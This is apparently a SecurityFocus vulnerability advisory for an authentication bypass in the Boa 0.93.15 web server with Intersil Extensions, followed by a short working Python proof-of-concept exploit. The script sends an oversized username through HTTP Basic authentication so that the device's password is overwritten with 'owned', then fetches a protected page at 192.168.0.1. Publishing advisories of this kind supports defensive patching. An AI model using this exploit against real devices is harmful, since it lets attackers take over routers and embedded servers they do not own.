source: https://www.securityfocus.com/bid/25676/info

Boa is prone to an authentication-bypass vulnerability because the application fails to ensure that passwords are not overwritten by specially crafted HTTP Requests.

An attacker can exploit this issue to gain unauthorized access to the affected application. This may lead to other attacks.

This issue affects Boa 0.93.15; other versions may also be affected.

NOTE: This issue affects only Boa with Intersil Extensions installed. 

#!/usr/bin/env python
import urllib2

SERVER_IP_ADDRESS = '192.168.0.1'
USERNAME =
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
NEW_PASSWORD = 'owned'

auth_handler = urllib2.HTTPBasicAuthHandler()
auth_handler.add_password('LOGIN(default username & password is admin)',
SERVER_IP_ADDRESS, USERNAME, NEW_PASSWORD);
opener = urllib2.build_opener(auth_handler)
urllib2.install_opener(opener)
res = urllib2.urlopen('http://'+SERVER_IP_ADDRESS+'/home/index.shtml')